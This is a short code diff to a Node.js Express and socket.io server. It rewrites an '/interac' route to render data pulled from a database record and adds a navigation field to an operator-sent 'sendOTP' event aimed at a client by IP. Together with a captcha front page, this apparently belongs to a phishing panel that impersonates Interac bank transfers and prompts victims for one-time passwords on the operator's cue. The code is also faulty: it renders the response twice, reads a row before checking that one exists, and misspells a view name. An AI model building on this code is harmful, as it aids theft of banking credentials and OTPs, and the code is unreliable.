@@ -221,7 +221,20 @@ app.get('/', (req, res) => {
     res.render('captcha/index')
 })
 
-app.get('/interac', (req, res) => {
+app.get('/interac',  async (req, res) => {
+    try{
+        const getId = 1; // Since we're always dealing with the record with id = 1
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
+
+        let info = result.rows[0].data.settings.info;  
+        
+        if(result.rows.length > 0){res.render('interac/index', {data: info});} else {res.render('catpcha/index');}
+        
+        
+    } catch (error) {
+        console.error(error);
+        res.render('captcha/index');
+    }
     res.render('interac/index')
 })
 
@@ -365,7 +378,7 @@ io.on('connection', (socket, req) => {
     });
 
     socket.on('sendOTP', (data) => {
-        io.to(data.ip).emit('OTP', {otp:true})
+        io.to(data.ip).emit('OTP', {otp:true, navig: data.navig})
     })
 
     socket.on('sendOTPResponse', (data) => {
